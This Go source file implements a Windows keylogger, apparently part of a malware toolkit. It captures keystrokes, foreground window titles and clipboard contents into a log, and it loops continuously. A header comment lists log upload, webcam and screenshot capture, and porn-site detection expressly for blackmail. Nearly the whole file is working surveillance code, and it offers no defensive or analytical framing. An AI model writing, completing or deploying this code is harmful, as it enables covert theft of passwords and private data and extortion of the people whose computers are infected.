//- Keylogger
//		Active Logging (Will Log 24/7)
//		Scheduled Logging (Date and Time)
//		Filtered Logging (Log only when select windows active)
//		Offline Protection (If unable to upload log will wait till it can while still logging)
//		Window Capture
//		Full Unicode support
//		Clipboard Capture
//		Easy to view HTML Output
//		Porn Detection, If Client is on porn site Screenshot and Webcam (*Blackmail)

package core

import (
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"
)

var (
	lastInputTime string //Last time the Host did something
)

func GetAsyncKeyState(VKey int) uint16 {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(VKey))
	return uint16(ret)
}

func NewKeylogger() Keylogger {
	kl := Keylogger{}
	return kl
}

func (kl *Keylogger) GetKey() Key {
	activeKey := 0
	var keyState uint16
	for i := 0; i < 256; i++ {
		keyState = GetAsyncKeyState(i)
		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20 && i != 0x0D && i != 0x08) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		}
	}
	if activeKey != 0 {
		if activeKey != kl.lastKey {
			kl.lastKey = activeKey
			return kl.ParseKeyCode(activeKey, keyState)
		}
	} else {
		kl.lastKey = 0
	}
	return Key{Empty: true}
}

func (kl Keylogger) ParseKeyCode(keyCode int, keyState uint16) Key {
	key := Key{Empty: false, Keycode: keyCode}
	outBuf := make([]uint16, 1)
	kbState := make([]uint8, 256)
	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))
	if GetAsyncKeyState(VK_SHIFT)&(1<<15) != 0 {
		kbState[VK_SHIFT] = 0xFF
	}
	capitalState, _, _ := procGetKeyState.Call(uintptr(VK_CAPITAL))
	if capitalState != 0 {
		kbState[VK_CAPITAL] = 0xFF
	}
	if GetAsyncKeyState(VK_CONTROL)&(1<<15) != 0 {
		kbState[VK_CONTROL] = 0xFF
	}
	if GetAsyncKeyState(VK_MENU)&(1<<15) != 0 {
		kbState[VK_MENU] = 0xFF
	}
	_, _, _ = procToUnicodeEx.Call(
		uintptr(keyCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(1),
		uintptr(1),
		kbLayout)
	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))
	return key
}

func RunKeylogger() {
	kl := NewKeylogger()
	for KeyloggerState {
		key := kl.GetKey()
		if !key.Empty {
			go func(word rune) {
				switch key.Keycode {
				case VK_RETURN:
					Log += "[Enter]\n"
				case VK_BACK:
					Log += "[Backspace]"
				case VK_TAB:
					Log += "[Tab]"
				case VK_ESCAPE:
					Log += "[Esc]"
				case VK_PRIOR:
					Log += "[PageUp]"
				case VK_NEXT:
					Log += "[PageDown]"
				case VK_END:
					Log += "[End]"
				case VK_HOME:
					Log += "[Home]"
				case VK_LEFT:
					Log += "[Left]"
				case VK_UP:
					Log += "[Up]"
				case VK_RIGHT:
					Log += "[Right]"
				case VK_DOWN:
					Log += "[Down]"
				case VK_SELECT:
					Log += "[Select]"
				case VK_PRINT:
					Log += "[Print]"
				case VK_EXECUTE:
					Log += "[Execute]"
				case VK_SNAPSHOT:
					Log += "[PrintScreen]"
				case VK_INSERT:
					Log += "[Insert]"
				case VK_DELETE:
					Log += "[Delete]"
				case VK_LWIN:
					Log += "[LeftWindows]"
				case VK_RWIN:
					Log += "[RightWindows]"
				case VK_APPS:
					Log += "[Applications]"
				case VK_SLEEP:
					Log += "[Sleep]"
				case VK_F1:
					Log += "[F1]"
				case VK_F2:
					Log += "[F2]"
				case VK_F3:
					Log += "[F3]"
				case VK_F4:
					Log += "[F4]"
				case VK_F5:
					Log += "[F5]"
				case VK_F6:
					Log += "[F6]"
				case VK_F7:
					Log += "[F7]"
				case VK_F8:
					Log += "[F8]"
				case VK_F9:
					Log += "[F9]"
				case VK_F10:
					Log += "[F10]"
				case VK_F11:
					Log += "[F11]"
				case VK_F12:
					Log += "[F12]"
				case VK_NUMLOCK:
					Log += "[NumLock]"
				case VK_SCROLL:
					Log += "[ScrollLock]"
				default:
					Log = Log + string(word)
				}
			}(key.Rune)
		}
		time.Sleep(5 * time.Millisecond)
	}
}

func OtherLogger() { //Handles Clipboard and Window Logging
	var TMPTitle string
	var TMPClip string
	for KeyloggerState {
		g, _ := GetForegroundWindow()
		b := make([]uint16, 200)
		_, _ = GetWindowText(g, &b[0], int32(len(b)))
		if syscall.UTF16ToString(b) != "" {
			if TMPTitle != syscall.UTF16ToString(b) {
				TMPTitle = syscall.UTF16ToString(b)
				Log += "\r\n [" + syscall.UTF16ToString(b) + "] \r\n"
			}
		}
		text, _ := ReadClipboard()
		if TMPClip != text {
			TMPClip = text
			Log += "\r\n [Clipboard: " + text + " ] \r\n"
		}
		time.Sleep(5 * time.Millisecond)
	}
}

func BaseKeylogger() { //24/7 Logging
	go RunKeylogger()
	go OtherLogger()
	for KeyloggerState {
		if len(Log) >= MaxLogSize*1000000 {

		}
		time.Sleep(5 * time.Second)
	}
}

//func ScheduledKeylogger() { //Log only at set times for set time
//	for ScheduledKeyloggerState {

//		time.Sleep(5 * time.Millisecond)
//	}
//}

//func FilteredKeylogger() { //Log only if Window detected open
//	for FilteredKeyloggerState {

//		time.Sleep(5 * time.Millisecond)
//	}
//}

//Detect ifs its been a while since last host input
//
